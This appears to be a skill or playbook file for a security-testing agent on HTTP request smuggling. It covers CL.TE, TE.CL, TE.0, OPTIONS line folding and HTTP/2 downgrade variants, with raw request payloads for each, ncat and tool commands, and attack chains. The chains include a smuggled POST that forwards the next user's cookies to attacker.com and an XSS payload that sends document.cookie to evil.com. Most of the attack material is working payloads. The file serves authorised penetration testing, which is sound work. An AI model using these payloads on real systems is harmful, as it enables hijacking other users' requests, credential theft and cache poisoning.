---
name: request_smuggling
description: HTTP request smuggling — exploit parser discrepancies between front-end proxies and back-end servers for request hijacking and cache poisoning
---

# HTTP Request Smuggling

HTTP request smuggling exploits parsing discrepancies between front-end infrastructure (reverse proxies, CDNs, load balancers) and back-end servers. When two components disagree on where one request ends and the next begins, an attacker can "smuggle" a hidden request that gets processed by the back-end as a separate request — hijacking other users' requests, poisoning caches, and bypassing security controls.

## Attack Surface

**Architecture Requirements**
- Two or more HTTP processors in the request path (CDN/proxy + origin, or proxy + proxy + origin)
- Discrepancies in how Transfer-Encoding and Content-Length headers are parsed
- HTTP/2 to HTTP/1.1 downgrade at any layer

**Common Vulnerable Stacks**
- Cloudflare/Akamai/Fastly + Apache/Nginx/IIS
- HAProxy/Nginx + Gunicorn/Puma/Node.js
- AWS ALB/CloudFront + custom backends
- Google Cloud Load Balancer + any backend (TE.0 variant)

**Detection Signals**
- Multiple proxies in the path (Via, X-Forwarded-For headers with multiple entries)
- Mixed HTTP/1.1 and HTTP/2 support
- Server header inconsistencies between responses

## Key Vulnerabilities

### CL.TE (Content-Length wins at front-end, Transfer-Encoding wins at back-end)

The front-end uses Content-Length to determine request boundaries; the back-end uses Transfer-Encoding: chunked.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end forwards 13 bytes (including `0\r\n\r\nSMUGGLED`). The back-end sees chunked encoding, processes chunk `0` (end of body), and treats `SMUGGLED` as the start of the next request.

**Detection payload:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
If the response is delayed or you get an error on the "next" request, CL.TE is confirmed.

### TE.CL (Transfer-Encoding wins at front-end, Content-Length wins at back-end)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

The front-end processes chunked encoding (reads chunk of size 8, then terminating chunk 0). The back-end uses Content-Length: 3, reads only `8\r\n`, and leaves `SMUGGLED\r\n0\r\n\r\n` in the buffer as the next request.

### TE.TE (Both support Transfer-Encoding, but disagree on obfuscation)

One processor rejects an obfuscated TE header while the other accepts it, creating a CL.TE or TE.CL condition:
```http
Transfer-Encoding: chunked
Transfer-Encoding: cow

Transfer-Encoding: chunked
Transfer-encoding: chunked

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding:

Transfer-Encoding:chunked
```

### TE.0 (James Kettle, 2025)

The front-end processes chunked encoding but the back-end ignores Transfer-Encoding entirely (treats it as Content-Length: 0 or reads nothing). Discovered on Google Cloud and Akamai infrastructure.

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 0

5
XXXXX
0


```

The front-end processes the chunked body. The back-end ignores TE, uses CL: 0, and the chunked data poisons the pipeline.

### OPTIONS Smuggling (CVE-2025-32094, Akamai)

Akamai's CDN handled OPTIONS requests differently, allowing smuggling via obsolete HTTP line folding:
```http
OPTIONS / HTTP/1.1
Host: vulnerable.com
Content-Length: 0
Transfer-Encoding:
 chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com

```
The space before `chunked` is an obsolete line folding continuation. Akamai's front-end treated it as a continuation of the previous header; the back-end parsed it as a valid Transfer-Encoding header.

### H2.CL and H2.TE (HTTP/2 Downgrade Smuggling)

When a front-end speaks HTTP/2 to the client but downgrades to HTTP/1.1 for the back-end:

**H2.CL:**
```
:method: POST
:path: /
:authority: vulnerable.com
content-length: 0

GET /admin HTTP/1.1
Host: vulnerable.com

```

HTTP/2 framing defines the body length, but the proxy inserts a Content-Length: 0 header in the downgraded HTTP/1.1 request. The back-end reads CL: 0 and treats the smuggled data as the next request.

**H2.TE:**
```
:method: POST
:path: /
:authority: vulnerable.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com

```

HTTP/2 technically prohibits Transfer-Encoding (except trailers), but some proxies pass it through when downgrading.

## Bypass Techniques

**Header Obfuscation**
- Tab instead of space: `Transfer-Encoding:\tchunked`
- Multiple values: `Transfer-Encoding: chunked, identity`
- CRLF variations: `\r\n` vs `\n` line endings
- Trailing whitespace: `Transfer-Encoding: chunked   `
- Header name case: `transfer-ENCODING: chunked`
- Duplicate headers: send both TE and CL with conflicting values

**Chunk Size Tricks**
- Chunk extensions: `0;ext=value\r\n` (valid per RFC but may confuse parsers)
- Leading zeros: `000` instead of `0` for terminating chunk
- Hex case: `a` vs `A` for chunk sizes

**Request Line Manipulation**
- Absolute-form URLs: `GET http://internal.host/ HTTP/1.1`
- Line folding (obsolete but still parsed by some servers)
- Invalid spacing in request line

## Chaining Attacks

### Request Smuggling to Cache Poisoning

Smuggle a request that causes the cache to store a malicious response for a legitimate URL:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 45
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: attacker.com

```

The back-end processes the smuggled GET and returns attacker-controlled content, which the CDN caches against the legitimate URL.

### Request Smuggling to Credential Theft

Smuggle a partial request that captures the next user's request:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: attacker.com
Content-Length: 1000

```

The next user's request (including cookies/auth headers) gets appended as the body of the smuggled POST and sent to the attacker's server.

### Request Smuggling to XSS

Redirect the next user's request to a reflected XSS endpoint:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /search?q=<script>fetch('https://evil.com/'+document.cookie)</script> HTTP/1.1
Host: vulnerable.com
Content-Length: 10

x=
```

## Testing Methodology

1. **Fingerprint the stack** — Identify all proxies/CDNs in the path via response headers (Server, Via, X-Cache, X-Served-By, X-Amz-Cf-Id). Use `curl -v` and check HTTP/2 support
2. **Timing-based detection** — Send CL.TE and TE.CL detection payloads; measure response time differences (10+ second delays indicate smuggling)
3. **Differential responses** — Send probe payloads and check for 400/502 errors or connection resets that indicate parser disagreement
4. **Confirm with Burp HTTP Request Smuggler** — Use the extension's scan feature (right-click > Extensions > HTTP Request Smuggler > Smuggle probe)
5. **Test TE obfuscation** — Iterate through TE header variations to find accepted obfuscations
6. **Test HTTP/2 downgrade** — Confirm if HTTP/2 requests are downgraded; test H2.CL and H2.TE vectors
7. **Chain to impact** — Once confirmed, chain to cache poisoning, credential theft, or access control bypass
8. **Verify isolation** — Ensure your testing does not affect other users (use unique paths, test during low-traffic periods)

## Tools

**Burp Suite HTTP Request Smuggler (BApp)**
```
Right-click request > Extensions > HTTP Request Smuggler > Smuggle probe
```
Automatically tests CL.TE, TE.CL, TE.TE, and H2 variants.

**Manual Testing with curl**
```bash
# CL.TE detection (should cause timeout or error on second request)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | ncat --ssl target.com 443

# TE.CL detection
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | ncat --ssl target.com 443
```

**smuggler.py (defparam)**
```bash
python3 smuggler.py -u https://target.com/ -m CL-TE TE-CL
```

**h2csmuggler (HTTP/2 cleartext smuggling)**
```bash
python3 h2csmuggler.py -x https://target.com/ --test
```

## Validation Requirements

1. **Demonstrate parser disagreement** — Show that the front-end and back-end interpret request boundaries differently (timing differential or split response)
2. **Show request poisoning** — Prove that a smuggled prefix affects the next request processed by the back-end (capture the affected response)
3. **Chain to impact** — Raw smuggling alone is sufficient for a report, but chaining to cache poisoning, credential theft, or access control bypass significantly strengthens impact
4. **Document the exact proxy/CDN stack** — Identify which components are involved and which variant works
5. **Reproduce consistently** — Smuggling is timing-sensitive; document the exact byte-level payload and connection reuse requirements

## False Positives

- Timeouts caused by network latency rather than parser disagreement
- Servers that normalize both CL and TE identically (no discrepancy)
- WAFs that strip or reject conflicting CL/TE headers before they reach the proxy chain
- HTTP/2 end-to-end without downgrade (framing prevents classic smuggling)

## Impact

- Request hijacking — capture other users' requests including authentication credentials
- Cache poisoning — serve malicious content to all users via CDN cache contamination
- Access control bypass — reach admin endpoints by smuggling requests that bypass front-end ACLs
- Reflected XSS amplification — turn reflected XSS into stored-like impact via cache poisoning
- Web application firewall bypass — smuggle requests that the WAF never inspects

## Pro Tips

1. Always start with timing-based detection before attempting exploitation — it is the safest and most reliable signal
2. Connection reuse is critical: smuggling only works when the front-end reuses the same TCP connection for multiple clients' requests (persistent connections / connection pooling)
3. Test during low-traffic windows to avoid affecting legitimate users and to get cleaner signals
4. TE.0 is the newest variant (2025) — many scanners do not check for it yet; test manually against GCP and Akamai stacks
5. HTTP/2 downgrade is increasingly common; always check if the front-end speaks H2 while the back-end receives H1
6. When testing H2 smuggling, use Burp's HTTP/2 support or `hyper` library — curl normalizes some headers that need to be malformed
7. Cache poisoning via smuggling is particularly devastating because it persists until the cache entry expires
8. Always document the exact bytes sent — smuggling payloads are sensitive to `\r\n` placement and off-by-one in Content-Length values

## Summary

Request smuggling exploits the fundamental ambiguity in HTTP message framing when multiple processors are in the path. The attack surface is expanding with HTTP/2 downgrade, cloud CDN edge cases (TE.0, OPTIONS folding), and increasingly complex proxy chains. Detect via timing differentials, confirm via response splitting, and chain to cache poisoning or credential theft for maximum impact.
